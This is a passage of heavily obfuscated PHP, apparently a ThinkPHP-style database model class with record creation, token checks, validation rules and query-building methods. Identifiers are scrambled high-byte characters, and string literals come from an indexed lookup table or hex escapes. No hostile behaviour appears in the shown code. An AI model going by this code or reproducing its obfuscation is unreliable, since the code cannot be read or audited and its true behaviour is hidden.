$”¯éõ®ä[12]; } $©ıƒŞÍ = $this->db->select($É¡¾Ïéè); if (!empty($©ıƒŞÍ)) { $øôª†ú‚ = explode($”¯éõ®ä[50], $Ş¶ÔŞ–); $Ş¶ÔŞ– = array_keys($©ıƒŞÍ[0]); $Üœ½‡…Ÿ = array_shift($Ş¶ÔŞ–); $‰¼‡í®– = array_shift($Ş¶ÔŞ–); $»®î¸ ‚ = array(); $úŠŞ¹Çä = count($øôª†ú‚); foreach ($©ıƒŞÍ as $ãÂ‹Ò) { $èùëòßı = $ãÂ‹Ò[$Üœ½‡…Ÿ]; if (2 == $úŠŞ¹Çä) { $»®î¸ ‚[$èùëòßı] = $ãÂ‹Ò[$‰¼‡í®–]; } else { $»®î¸ ‚[$èùëòßı] = is_string($Ù…—€“) ? implode($Ù…—€“, $ãÂ‹Ò) : $ãÂ‹Ò; } } return $»®î¸ ‚; } } else { if (!0 !== $Ù…—€“) { $É¡¾Ïéè[$”¯éõ®ä[368]] = is_numeric($Ù…—€“) ? $Ù…—€“ : 1; } if ($Ù…—€“ === $”¯éõ®ä[332]) { unset($É¡¾Ïéè[$”¯éõ®ä[368]]); } $ãÂ‹Ò = $this->db->select($É¡¾Ïéè); if (!empty($ãÂ‹Ò)) { if ($Ù…—€“ === $”¯éõ®ä[332]) { return reset($ãÂ‹Ò[0]); } if (!0 !== $Ù…—€“ && 1 == $É¡¾Ïéè[$”¯éõ®ä[368]]) { return reset($ãÂ‹Ò[0]); } foreach ($ãÂ‹Ò as $™§ñÀÇ²) { $™×Š¬Ï[] = $™§ñÀÇ²[$Ş¶ÔŞ–]; } return $™×Š¬Ï; } } return null; } public function create($´Œ¥¥Ş³ = '', $äŠ¬±ä© = '') { $ú»õÓÕ´ =& $_SERVER[¿ğÚ‰±–]; if (empty($´Œ¥¥Ş³)) { $´Œ¥¥Ş³ = $_POST; } elseif (is_object($´Œ¥¥Ş³)) { $´Œ¥¥Ş³ = get_object_vars($´Œ¥¥Ş³); } if (empty($´Œ¥¥Ş³) || !is_array($´Œ¥¥Ş³)) { $this->error = think_lang($ú»õÓÕ´[348]); return !1; } $´Œ¥¥Ş³ = $this->parseFieldsMap($´Œ¥¥Ş³, 0); $äŠ¬±ä© = $äŠ¬±ä© ? $äŠ¬±ä© : (!empty($´Œ¥¥Ş³[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ú»õÓÕ´[350]])) { $£Õ›Å·¥ = $this->options[$ú»õÓÕ´[350]]; unset($this->options[$ú»õÓÕ´[350]]); } elseif ($äŠ¬±ä© == THINK_MODEL_INSERT && isset($this->insertFields)) { $£Õ›Å·¥ = $this->insertFields; } elseif ($äŠ¬±ä© == THINK_MODEL_UPDATE && isset($this->updateFields)) { $£Õ›Å·¥ = $this->updateFields; } if (isset($£Õ›Å·¥)) { if (is_string($£Õ›Å·¥)) { $£Õ›Å·¥ = explode($ú»õÓÕ´[50], $£Õ›Å·¥); } if (think_config($ú»õÓÕ´[374])) { $£Õ›Å·¥[] = think_config($ú»õÓÕ´[375]); } foreach ($´Œ¥¥Ş³ as $Ëı”‡û‚ => $Š®×ø½) { if (!in_array($Ëı”‡û‚, $£Õ›Å·¥)) { unset($´Œ¥¥Ş³[$Ëı”‡û‚]); } } } if (!$this->autoValidation($´Œ¥¥Ş³, $äŠ¬±ä©)) { return !1; } if (!$this->autoCheckToken($´Œ¥¥Ş³)) { $this->error = think_lang($ú»õÓÕ´[376]); return !1; } if ($this->autoCheckFields) { $£Õ›Å·¥ = $this->getDbFields(); foreach ($´Œ¥¥Ş³ as $Ëı”‡û‚ => $Š®×ø½) { if (!in_array($Ëı”‡û‚, $£Õ›Å·¥)) { unset($´Œ¥¥Ş³[$Ëı”‡û‚]); } elseif (MAGIC_QUOTES_GPC && is_string($Š®×ø½)) { $´Œ¥¥Ş³[$Ëı”‡û‚] = stripslashes($Š®×ø½); } } } $this->autoOperation($´Œ¥¥Ş³, $äŠ¬±ä©); $this->data = $´Œ¥¥Ş³; return $´Œ¥¥Ş³; } public function autoCheckToken($ú¹·­Î°) { $Û‚âŒ´ =& $_SERVER[¿ğÚ‰±–]; if (isset($this->options[$Û‚âŒ´[377]]) && !$this->options[$Û‚âŒ´[377]]) { return !0; } if (think_config($Û‚âŒ´[374])) { $‚Ô–ÔÒ = think_config($Û‚âŒ´[375]); if (!isset($ú¹·­Î°[$‚Ô–ÔÒ]) || Session::get($‚Ô–ÔÒ)) { return !1; } list($şÏĞœÚ­, $ãßºÜÑó) = explode($Û‚âŒ´[11], $ú¹·­Î°[$‚Ô–ÔÒ]); if ($ãßºÜÑó && Session::get($‚Ô–ÔÒ . $Û‚âŒ´[10] . $şÏĞœÚ­) === $ãßºÜÑó) { Session::remove($‚Ô–ÔÒ . $Û‚âŒ´[10] . $şÏĞœÚ­); return !0; } if (think_config($Û‚âŒ´[378])) { Session::remove($‚Ô–ÔÒ . $Û‚âŒ´[10] . $şÏĞœÚ­); } return !1; } return !0; } public function regex($âÓ´Ô¸, $ŒêÔ¡£Š) { $¥¿úÕ =& $_SERVER[¿ğÚ‰±–]; $²”òÇË€ = array($¥¿úÕ[379] => $¥¿úÕ[380], $¥¿úÕ[381] => $¥¿úÕ[382], $¥¿úÕ[383] => $¥¿úÕ[384], $¥¿úÕ[385] => $¥¿úÕ[386], $¥¿úÕ[387] => $¥¿úÕ[388], $¥¿úÕ[389] => $¥¿úÕ[390], $¥¿úÕ[391] => $¥¿úÕ[392], $¥¿úÕ[366] => $¥¿úÕ[393], $¥¿úÕ[394] => $¥¿úÕ[395]); if (isset($²”òÇË€[strtolower($ŒêÔ¡£Š)])) { $ŒêÔ¡£Š = $²”òÇË€[strtolower($ŒêÔ¡£Š)]; } return preg_match($ŒêÔ¡£Š, $âÓ´Ô¸) === 1; } private function autoOperation(&$İûÆ›°©, $™³®ÒÃ) { $›äŸ·›¶ =& $_SERVER[¿ğÚ‰±–]; if (!empty($this->options[$›äŸ·›¶[396]])) { $–›·Øäö = $this->options[$›äŸ·›¶[396]]; unset($this->options[$›äŸ·›¶[396]]); } elseif (!empty($this->_auto)) { $–›·Øäö = $this->_auto; } if (isset($–›·Øäö)) { foreach ($–›·Øäö as $ŒªÇˆ) { if (empty($ŒªÇˆ[2])) { $ŒªÇˆ[2] = THINK_MODEL_INSERT; } if ($™³®ÒÃ == $ŒªÇˆ[2] || $ŒªÇˆ[2] == THINK_MODEL_BOTH) { switch (trim($ŒªÇˆ[3])) { case $›äŸ·›¶[397]: case $›äŸ·›¶[398]: $’ù¬×ÓÎ = isset($ŒªÇˆ[4]) ? (array) $ŒªÇˆ[4] : array(); if (isset($İûÆ›°©[$ŒªÇˆ[0]])) { array_unshift($’ù¬×ÓÎ, $İûÆ›°©[$ŒªÇˆ[0]]); } if ($›äŸ·›¶[397] == $ŒªÇˆ[3]) { $İûÆ›°©[$ŒªÇˆ[0]] = call_user_func_array($ŒªÇˆ[1], $’ù¬×ÓÎ); } else { $İûÆ›°©[$ŒªÇˆ[0]] = call_user_func_array(array(&$this, $ŒªÇˆ[1]), $’ù¬×ÓÎ); } break; case $›äŸ·›¶[350]: $İûÆ›°©[$ŒªÇˆ[0]] = $İûÆ›°©[$ŒªÇˆ[1]]; break; case $›äŸ·›¶[399]: if ($›äŸ·›¶[12] === $İûÆ›°©[$ŒªÇˆ[0]]) { unset($İûÆ›°©[$ŒªÇˆ[0]]); } break; case $›äŸ·›¶[400]: default: $İûÆ›°©[$ŒªÇˆ[0]] = $ŒªÇˆ[1]; } if (!1 === $İûÆ›°©[$ŒªÇˆ[0]]) { unset($İûÆ›°©[$ŒªÇˆ[0]]); } } } } return $İûÆ›°©; } protected function autoValidation($áìÉ±ù, $¼®¥´ÛÇ) { $Òıƒê£¦ =& $_SERVER[¿ğÚ‰±–]; if (!empty($this->options[$Òıƒê£¦[401]])) { $ˆ›…×‰ï = $this->options[$Òıƒê£¦[401]]; unset($this->options[$Òıƒê£¦[401]]); } elseif (!empty($this->_validate)) { $ˆ›…×‰ï = $this->_validate; } if (isset($ˆ›…×‰ï)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ˆ›…×‰ï as $…Ö´¯–ó => $ß­¢ó ã) { if (empty($ß­¢ó ã[5]) || $ß­¢ó ã[5] == THINK_MODEL_BOTH || $ß­¢ó ã[5] == $¼®¥´ÛÇ) { if (0 == strpos($ß­¢ó ã[2], $Òıƒê£¦[402]) && strpos($ß­¢ó ã[2], $Òıƒê£¦[403])) { $ß­¢ó ã[2] = think_lang(substr($ß­¢ó ã[2], 2, -1)); } $ß­¢ó ã[3] = isset($ß­¢ó ã[3]) ? $ß­¢ó ã[3] : THINK_EXISTS_VALIDATE; $ß­¢ó ã[4] = isset($ß­¢ó ã[4]) ? $ß­¢ó ã[4] : $Òıƒê£¦[404]; switch ($ß­¢ó ã[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($áìÉ±ù, $ß­¢ó ã)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Òıƒê£¦[12] != trim($áìÉ±ù[$ß­¢ó ã[0]])) { if (!1 === $this->_validationField($áìÉ±ù, $ß­¢ó ã)) { return !1; } } break; default: if (isset($áìÉ±ù[$ß­¢ó ã[0]])) { if (!1 === $this->_validationField($áìÉ±ù, $ß­¢ó ã)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($‘£ÃüËï, $²Ø¸¼) { if (!1 === $this->_validationFieldItem($‘£ÃüËï, $²Ø¸¼)) { if ($this->patchValidate) { $this->error[$²Ø¸¼[0]] = $²Ø¸¼[2]; } else { $this->error = $²Ø¸¼[2]; return !1; } } return; } protected function _validationFieldItem($òâäâŸÚ, $§¥Ü¸›) { $‘§ğ©±â =& $_SERVER[¿ğÚ‰±–]; switch (strtolower(trim($§¥Ü¸›[4]))) { case $‘§ğ©±â[397]: case $‘§ğ©±â[398]: $ôÈ€±éü = isset($§¥Ü¸›[6]) ? (array) $§¥Ü¸›[6] : array(); if (is_string($§¥Ü¸›[0]) && strpos($§¥Ü¸›[0], $‘§ğ©±â[50])) { $§¥Ü¸›[0] = explode($‘§ğ©±â[50], $§¥Ü¸›[0]); } if (is_array($§¥Ü¸›[0])) { foreach ($§¥Ü¸›[0] as $á¿âÈöß) { $ŸÉ‚¸Áà[$á¿âÈöß] = $òâäâŸÚ[$á¿âÈöß]; } array_unshift($ôÈ€±éü, $ŸÉ‚¸Áà); } else { array_unshift($ôÈ€±éü, $òâäâŸÚ[$§¥Ü¸›[0]]); } if ($‘§ğ©±â[397] == $§¥Ü¸›[4]) { return call_user_func_array($§¥Ü¸›[1], $ôÈ€±éü); } else { return call_user_func_array(array(&$this, $§¥Ü¸›[1]), $ôÈ€±éü); } case $‘§ğ©±â[405]: return $òâäâŸÚ[$§¥Ü¸›[0]] == $òâäâŸÚ[$§¥Ü¸›[1]]; case $‘§ğ©±â[406]: if (is_string($§¥Ü¸›[0]) && strpos($§¥Ü¸›[0], $‘§ğ©±â[50])) { $§¥Ü¸›[0] = explode($‘§ğ©±â[50], $§¥Ü¸›[0]); } $É¬ÎúÄ = array(); if (is_array($§¥Ü¸›[0])) { foreach ($§¥Ü¸›[0] as $á¿âÈöß) { $É¬ÎúÄ[$á¿âÈöß] = $òâäâŸÚ[$á¿âÈöß]; } } else { $É¬ÎúÄ[$§¥Ü¸›[0]] = $òâäâŸÚ[$§¥Ü¸›[0]]; } if (!empty($òâäâŸÚ[$this->getPk()])) { $É¬ÎúÄ[$this->getPk()] = array($‘§ğ©±â[407], $òâäâŸÚ[$this->getPk()]); } if ($this->where($É¬ÎúÄ)->find()) { return !1; } return !0; default: return $this->check($òâäâŸÚ[$§¥Ü¸›[0]], $§¥Ü¸›[1], $§¥Ü¸›[4]); } } public function check($·êÁ³ªĞ, $Á°Ãò¬µ, $Ê¥áÎõü = "\x72\x65\x67\145\x78") { $Á¥°Õ =& $_SERVER[¿ğÚ‰±–]; $Ê¥áÎõü = strtolower(trim($Ê¥áÎõü)); switch ($Ê¥áÎõü) { case $Á¥°Õ[7]: case $Á¥°Õ[408]: $ú¥äÅö£ = is_array($Á°Ãò¬µ) ? $Á°Ãò¬µ : explode($Á¥°Õ[50], $Á°Ãò¬µ); return $Ê¥áÎõü == $Á¥°Õ[7] ? in_array($·êÁ³ªĞ, $ú¥äÅö£) : !in_array($·êÁ³ªĞ, $ú¥äÅö£); case $Á¥°Õ[409]: case $Á¥°Õ[410]: if (is_array($Á°Ãò¬µ)) { $ı¤—ğ’ã = $Á°Ãò¬µ[0]; $É—¹š—© = $Á°Ãò¬µ[1]; } else { list($ı¤—ğ’ã, $É—¹š—©) = explode($Á¥°Õ[50], $Á°Ãò¬µ); } return $Ê¥áÎõü == $Á¥°Õ[409] ? $·êÁ³ªĞ >= $ı¤—ğ’ã && $·êÁ³ªĞ <= $É—¹š—© : $·êÁ³ªĞ < $ı¤—ğ’ã || $·êÁ³ªĞ > $É—¹š—©; case $Á¥°Õ[411]: case $Á¥°Õ[412]: return $Ê¥áÎõü == $Á¥°Õ[411] ? $·êÁ³ªĞ == $Á°Ãò¬µ : $·êÁ³ªĞ != $Á°Ãò¬µ; case $Á¥°Õ[413]: $ıìéØí° = mb_strlen($·êÁ³ªĞ, $Á¥°Õ[414]); if (strpos($Á°Ãò¬µ, $Á¥°Õ[50])) { list($ı¤—ğ’ã, $É—¹š—©) = explode($Á¥°Õ[50], $Á°Ãò¬µ); return $ıìéØí° >= $ı¤—ğ’ã && $ıìéØí° <= $É—¹š—©; } else { return $ıìéØí° == $Á°Ãò¬µ; } case $Á¥°Õ[415]: list($²ùè®ôõ, $³°†Çí”) = explode($Á¥°Õ[50], $Á°Ãò¬µ); if (!is_numeric($²ùè®ôõ)) { $²ùè®ôõ = strtotime($²ùè®ôõ); } if (!is_numeric($³°†Çí”)) { $³°†Çí” = strtotime($³°†Çí”); } return NOW_TIME >= $²ùè®ôõ && NOW_TIME <= $³°†Çí”; case $Á¥°Õ[416]: return in_array(get_client_ip(), explode($Á¥°Õ[50], $Á°Ãò¬µ)); case $Á¥°Õ[417]: return !in_array(get_client_ip(), explode($Á¥°Õ[50], $Á°Ãò¬µ)); case $Á¥°Õ[404]: default: return $this->regex($·êÁ³ªĞ, $Á°Ãò¬µ); } } public function query($‹ÆËÈ®£, $Ö‘˜¿¶– = false) { $ÂÀûˆ¹ =& $_SERVER[¿ğÚ‰±–]; if (!is_bool($Ö‘˜¿¶–) && !is_array($Ö‘˜¿¶–)) { $Ö‘˜¿¶– = func_get_args(); array_shift($Ö‘˜¿¶–); } $‹ÆËÈ®£ = str_replace(array($ÂÀûˆ¹[262], $ÂÀûˆ¹[418]), $ÂÀûˆ¹[53], $‹ÆËÈ®£); $‹ÆËÈ®£ = $this->parseSql($‹ÆËÈ®£, $Ö‘˜¿¶–); return $this->db->query($‹ÆËÈ®£); } public function execute($Ñ´×ùê, $ç«‚–¼â = false) { if (!is_bool($ç«‚–¼â) && !is_array($ç«‚–¼â)) { $ç«‚–¼â = func_get_args(); array_shift($ç«‚–¼â); } $Ñ´×ùê = $this->parseSql($Ñ´×ùê, $ç«‚–¼â); return $this->db->execute($Ñ´×ùê); } protected function parseSql($…­Â“àè, $Éø²Åôñ) { $Á˜àİô’ =& $_SERVER[¿ğÚ‰±–]; if (!0 === $Éø²Åôñ) { $ë€´Öñè = $this->_parseOptions(); $…­Â“àè = $this->db->parseSql($…­Â“àè, $ë€´Öñè); } elseif (is_array($Éø²Åôñ)) { $Éø²Åôñ = array_map(array($this->db, $Á˜àİô’[419]), $Éø²Åôñ); $…­Â“àè = vsprintf($…­Â“àè, $Éø²Åôñ); } else { $…­Â“àè = strtr($…­Â“àè, array($Á˜àİô’[420] => $this->getTableName(), $Á˜àİô’[421] => think_config($Á˜àİô’[321]))); } $this->db->setModel($this->name); return $…­Â“àè; } public function db($ë‡Ö®»ê = '', $€ºÎ‘£ = '', $ïÚæÃïà = array()) { $ÁÁà›éÜ =& $_SERVER[¿ğÚ‰±–]; if ($ÁÁà›éÜ[12] === $ë‡Ö®»ê && $this->db) { return $this->db; } static $½Äöûâ = array(); static $¼º”ªü‚ = array(); if (!isset($¼º”ªü‚[$ë‡Ö®»ê]) || isset($¼º”ªü‚[$ë‡Ö®»ê]) && $€ºÎ‘£ && $½Äöûâ[$ë‡Ö®»ê] != $€ºÎ‘£) { if (!empty($€ºÎ‘£) && is_string($€ºÎ‘£) && !1 === strpos($€ºÎ‘£, $ÁÁà›éÜ[8])) { $€ºÎ‘£ = think_config($€ºÎ‘£); } $ë‡Ö®»ê = think_guid($€ºÎ‘£); $¼º”ªü‚[$ë‡Ö®»ê] = Db::getInstance($€ºÎ‘£); } elseif (NULL === $€ºÎ‘£) { $¼º”ªü‚[$ë‡Ö®»ê]->close(); unset($¼º”ªü‚[$ë‡Ö®»ê]); return; } if (!empty($ïÚæÃïà)) { if (is_string($ïÚæÃïà)) { parse_str($ïÚæÃïà, $ïÚæÃïà); } foreach ($ïÚæÃïà as $˜ Ì¼Úø => $š˜¥Ãö) { $this->setProperty($˜ Ì¼Úø, $š˜¥Ãö); } } $½Äöûâ[$ë‡Ö®»ê] = $€ºÎ‘£; $this->db = $¼º”ªü‚[$ë‡Ö®»ê]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ÑÉÜÓÈ± = get_class($this); if ($ÑÉÜÓÈ± == $_SERVER[¿ğÚ‰±–][422]) { return $this->name; } $this->name = substr($ÑÉÜÓÈ±, 0, -5); } return $this->name; } public function getTableName() { $ôÈ„¡’Œ =& $_SERVER[¿ğÚ‰±–]; if (empty($this->trueTableName)) { $è–£ÌïÔ = !empty($this->tablePrefix) ? $this->tablePrefix : $ôÈ„¡’Œ[12]; if (!empty($this->tableName)) { $è–£ÌïÔ .= $this->tableName; } else { $è–£ÌïÔ .= think_parse_name($this->name); } $this->trueTableName = strtolower($è–£ÌïÔ); } return (!empty($this->dbName) ? $this->dbName . $ôÈ„¡’Œ[10] : $ôÈ„¡’Œ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ŠªÖƒåÉ =& $_SERVER[¿ğÚ‰±–]; return isset($this->fields[$ŠªÖƒåÉ[328]]) ? $this->fields[$ŠªÖƒåÉ[328]] : $this->pk; } public function getDbFields() { $¦ÖˆÑ‰ =& $_SERVER[¿ğÚ‰±–]; if (isset($this->options[$¦ÖˆÑ‰[356]])) { $ÌÈÁòÄ¦ = $this->db->getFields($this->options[$¦ÖˆÑ‰[356]]); return $ÌÈÁòÄ¦ ? array_keys($ÌÈÁòÄ¦) : !1; } if ($this->fields) { $ÌÈÁòÄ¦ = $this->fields; unset($ÌÈÁòÄ¦[$¦ÖˆÑ‰[327]], $ÌÈÁòÄ¦[$¦ÖˆÑ‰[328]], $ÌÈÁòÄ¦[$¦ÖˆÑ‰[329]], $ÌÈÁòÄ¦[$¦ÖˆÑ‰[326]]); return $ÌÈÁòÄ¦; } return !1; } public function data($©äÇœÀ = '') { $Î»ŞûÍ™ =& $_SERVER[¿ğÚ‰±–]; if ($Î»ŞûÍ™[12] === $©äÇœÀ && !empty($this->data)) { return $this->data; } if (is_object($©äÇœÀ)) { $©äÇœÀ = get_object_vars($©äÇœÀ); } elseif (is_string($©äÇœÀ)) { parse_str($©äÇœÀ, $©äÇœÀ); } elseif (!is_array($©äÇœÀ)) { think_exception(think_lang($Î»ŞûÍ™[348])); } $this->data = $©äÇœÀ; return $this; } public function join($˜ˆÎ±Ğ ) { $ëõäã´ª =& $_SERVER[¿ğÚ‰±–]; if (is_array($˜ˆÎ±Ğ )) { $this->options[$ëõäã´ª[359]] = $˜ˆÎ±Ğ ; } elseif (!empty($˜ˆÎ±Ğ )) { $this->options[$ëõäã´ª[359]][] = $˜ˆÎ±Ğ ; } return $this; } public function union($ÄİîšØ, $™òÄ¾§ß = false) { $ğ×¶ü™£ =& $_SERVER[¿ğÚ‰±–]; if (empty($ÄİîšØ)) { return $this; } if ($™òÄ¾§ß) { $this->options[$ğ×¶ü™£[423]][$ğ×¶ü™£[424]] = !0; } if (is_object($ÄİîšØ)) { $ÄİîšØ = get_object_vars($ÄİîšØ); } if (is_string($ÄİîšØ)) { $É÷ÊÉ‘‘ = $ÄİîšØ; } elseif (is_array($ÄİîšØ)) { if (isset($ÄİîšØ[0])) { $this->options[$ğ×¶ü™£[423]] = array_merge($this->options[$ğ×¶ü™£[423]], $ÄİîšØ); return $this; } else { $É÷ÊÉ‘‘ = $ÄİîšØ; } } else { think_exception(think_lang($ğ×¶ü™£[348])); } $this->options[$ğ×¶ü™£[423]][] = $É÷ÊÉ‘‘; return $this; } public function cache($°ñ±õ¼ñ = true, $Ş—½±¡ = null, $ë¶àí = '') { $ØòòŸ¶ =& $_SERVER[¿ğÚ‰±–]; if (!1 !== $°ñ±õ¼ñ) { $this->options[$ØòòŸ¶[425]] = array($ØòòŸ¶[97] => $°ñ±õ¼ñ, $ØòòŸ¶[415] => $Ş—½±¡, $ØòòŸ¶[33] => $ë¶àí); } return $this; } public function field($½úîí¯‰, $ŞÁæéŒ = false) { $ò²ÛªÖõ =& $_SERVER[¿ğÚ‰±–]; if (!0 === $½úîí¯‰) { $ÔÒ¯ÚŒâ = $this->getDbFields(); $½úîí¯‰ = $ÔÒ¯ÚŒâ ? $ÔÒ¯ÚŒâ : $ò²ÛªÖõ[220]; } elseif ($ŞÁæéŒ) { if (is_string($½úîí¯‰)) { $½úîí¯‰ = explode($ò²ÛªÖõ[50], $½úîí¯‰); } $ÔÒ¯ÚŒâ = $this->getDbFields(); $½úîí¯‰ = $ÔÒ¯ÚŒâ ? array_diff($ÔÒ¯ÚŒâ, $½úîí¯‰) : $½úîí¯‰; } $this->options[$ò²ÛªÖõ[350]] = $½úîí¯‰; return $this; } public function scope($­°Öò©Ã = '', $¾äö“Öà = NULL) { $€´İóÏµ =& $_SERVER[¿ğÚ‰±–]; if ($€´İóÏµ[12] === $­°Öò©Ã) { if (isset($this->_scope[$€´İóÏµ[37]])) { $‘–†Ñºø = $this->_scope[$€´İóÏµ[37]]; } else { return $this; } } elseif (is_string($­°Öò©Ã)) { $’¥Ñ –« = explode($€´İóÏµ[50], $­°Öò©Ã); $‘–†Ñºø = array(); foreach ($’¥Ñ –« as $êº´ëú) { if (!isset($this->_scope[$êº´ëú])) { continue; } $‘–†Ñºø = array_merge($‘–†Ñºø, $this->_scope[$êº´ëú]); } if (!empty($¾äö“Öà) && is_array($¾äö“Öà)) { $‘–†Ñºø = array_merge($‘–†Ñºø, $¾äö“Öà); } } elseif (is_array($­°Öò©Ã)) { $‘–†Ñºø = $­°Öò©Ã; } if (is_array($‘–†Ñºø) && !empty($‘–†Ñºø)) { $this->options = array_merge($this->options, array_change_key_case($‘–†Ñºø)); } return $this; } public function where($•İ˜¿‹Û, $ÃŞÎïâá = null) { $ÑªÄ†Àâ =& $_SERVER[¿ğÚ‰±–]; if (!is_null($ÃŞÎïâá) && is_string($•İ˜¿‹Û)) { if (!is_array($ÃŞÎïâá)) { $ÃŞÎïâá = func_get_args(); array_shift($ÃŞÎïâá); } $ÃŞÎïâá = array_map(array($this->db, $ÑªÄ†Àâ[419]), $ÃŞÎïâá); $•İ˜¿‹Û = vsprintf($•İ˜¿‹Û, $ÃŞÎïâá); } elseif (is_object($•İ˜¿‹Û)) { $•İ˜¿‹Û = get_object_vars($•İ˜¿‹Û); } elseif (is_array($•İ˜¿‹Û)) { foreach ($•İ˜¿‹Û as $ÌõŠúê => $²û²†ŒÔ) { if ((is_numeric($ÌõŠúê) || !$ÌõŠúê) && is_string($²û²†ŒÔ)) { if (strpos($²û²†ŒÔ, $ÑªÄ†Àâ[426]) === 0) { continue; } think_trace($ÑªÄ†Àâ[427], $ÑªÄ†Àâ[12], $ÑªÄ†Àâ[49]); die; } } } if (is_string($•İ˜¿‹Û) && $ÑªÄ†Àâ[12] != $•İ˜¿‹Û) { $ÏÑÒš• = array(); $ÏÑÒš•[$ÑªÄ†Àâ[428]] = $•İ˜¿‹Û; $•İ˜¿‹Û = $ÏÑÒš•; } if (isset($this->options[$ÑªÄ†Àâ[352]])) { $this->options[$ÑªÄ†Àâ[352]] = array_merge($this->options[$ÑªÄ†Àâ[352]], $•İ˜¿‹Û); } else { $this->options[$ÑªÄ†Àâ[352]] = $•İ˜¿‹Û; } return $this; } public function limit($¦àœ§ûÊ, $­˜µ“ü› = null) { $¥õâßö =& $_SERVER[¿ğÚ‰±–]; $this->options[$¥õâßö[368]] = is_null($­˜µ“ü›) ? $¦àœ§ûÊ : $¦àœ§ûÊ . $¥õâßö[50] . $­˜µ“ü›; return $this; } public function page($’æ’¬Ûù, $£ô—ß– = null) { $ˆºËÛáö =& $_SERVER[¿ğÚ‰±–]; $this->options[$ˆºËÛáö[429]] = is_null($£ô—ß–) ? $’æ’¬Ûù : $’æ’¬Ûù . $ˆºËÛáö[50] . $£ô—ß–; return $this; } public function comment($Ñ°†ç©) { $this->options[$_SERVER[¿ğÚ‰±–][430]] = $Ñ°†ç©; return $this; } public function setProperty($…ÙÒÉ¡à, $¥ˆé€ëğ) { if (property_exists($this, $…ÙÒÉ¡à)) { $this->{$…ÙÒÉ¡à} = $¥ˆé€ëğ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\151\x66\x79\124\x69\155\145", "\x74\x69\155\145", "\151\x6e\163\x65\162\164\x2c\x75\x70\144\x61\x74\x65", "\x66\165\156\x63\164\x69\x6f\x6e"), array("\x63\162\x65\141\x74\145\124\151\155\145", "\164\x69\155\145", "\x69\156\163\145\162\x74", "\146\165\156\143\x74\x69\157\x6e")); public function setDataAuto($ºª«€Æ‚) { $this->dataAuto = $ºª«€Æ‚; } public function __construct($ë³ŒÅ¹˜ = '', $ûµ›Ñü = '', $ìáÎùÈˆ = '') { parent::__construct($ë³ŒÅ¹˜, $ûµ›Ñü, $ìáÎùÈˆ); } protected $tableMeta = array(); protected function _beforeInsert(&$Ì‚¹˜ÌĞ, $›Œ­°ËÚ) { $ş“¢çú =& $_SERVER[¿ğÚ‰±–]; if (!$this->checkDataAutoHas($ş“¢çú[431])) { return; } $this->dataBeforeFilter($Ì‚¹˜ÌĞ, $ş“¢çú[431]); } protected function _beforeUpdate(&$ÕÇÄø‹–, $ãæÄºó–) { $‘‘¹ŞÇ¿ =& $_SERVER[¿ğÚ‰±–]; if (!$this->checkDataAutoHas($‘‘¹ŞÇ¿[432])) { return; } $this->dataBeforeFilter($ÕÇÄø‹–, $‘‘¹ŞÇ¿[432]); } protected function _afterSelect(&$â¦†ĞöÅ, $æ³×Ï÷) { if (!is_array($â¦†ĞöÅ)) { return; } if (!$this->checkDataAutoHas($_SERVER[¿ğÚ‰±–][433])) { return; } foreach ($â¦†ĞöÅ as &$óÙ¥Ÿ¤Ä) { $this->dataAfterFilter($óÙ¥Ÿ¤Ä); } unset($óÙ¥Ÿ¤Ä); } protected function _afterFind(&$“¸°€óÓ, $¨©éôà) { if (!is_array($“¸°€óÓ)) { return; } if (!$this->checkDataAutoHas($_SERVER[¿ğÚ‰±–][433])) { return; } $this->dataAfterFilter($“¸°€óÓ); } public static function textEncode($À ıÙÑ) { if (!$À ıÙÑ) { return $À ıÙÑ; } $ÚˆÚÙ„ = json_encode($À ıÙÑ); $ÚˆÚÙ„ = preg_replace_callback($_SERVER[¿ğÚ‰±–][434], function ($Ğ¯§ı¡–) { return addslashes($Ğ¯§ı¡–[0]); }, $ÚˆÚÙ„); return json_decode($ÚˆÚÙ„); } public static function textDecode($íäî‡—Ò) { $ì±‘¿’ƒ =& $_SERVER[¿ğÚ‰±–]; $£Ş™æ«ê = json_encode($íäî‡—Ò); $£Ş™æ«ê = preg_replace_callback($ì±‘¿’ƒ[435], function ($ûµØ¢˜ö) { return $_SERVER[¿ğÚ‰±–][100]; }, $£Ş™æ«ê); return json_decode($£Ş™æ«ê); } public function setAutoIncrement($üú•®«Â) { $ŸùáœŞú = array($this->getPk() => $üú•®«Â); $ºÀÀğá• = $this->data($ŸùáœŞú)->add(); if ($ºÀÀğá•) { $this->delete($ºÀÀğá•); } } public function getAutoIncrement() { $½Ä½ = $this->getTableName(); $Ü…­–¨ = $this->max($this->getPk()); $‘ÏÜ‡œ = $this->query("\163\x68\157\167\40\x74\x61\142\x6c\x65\40\163\164\x61\164\165\163\x20\167\x68\x65\162\x65\40\116\141\155\145\75\x27{$½Ä½}\x27"); $âŞª§‰­ = $‘ÏÜ‡œ[0][$_SERVER[¿ğÚ‰±–][436]]; $éØ„öİ® = max($Ü…­–¨, $âŞª§‰­); return $éØ„öİ®; } protected function _callBefore($Çù’‚ãÕ, $½îõöªã) { return $this->cacheCallCheck($Çù’‚ãÕ, $½îõöªã, !1); } protected function _callAfter($úˆÙùùı, $ëïš²„™) { return $this->cacheCallCheck($úˆÙùùı, $ëïš²„™, !0); } protected function cacheFunctionAlias($óëËÃıò) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($”ñ´åéó, $µ»¹Û–³, $¤‚ïŞ = false) { $Âİ–Ä—… = $this->cacheFunctionAlias($µ»¹Û–³); if (!$Âİ–Ä—…) { return; } foreach ($Âİ–Ä—… as $÷ÑÃÆ¯ => 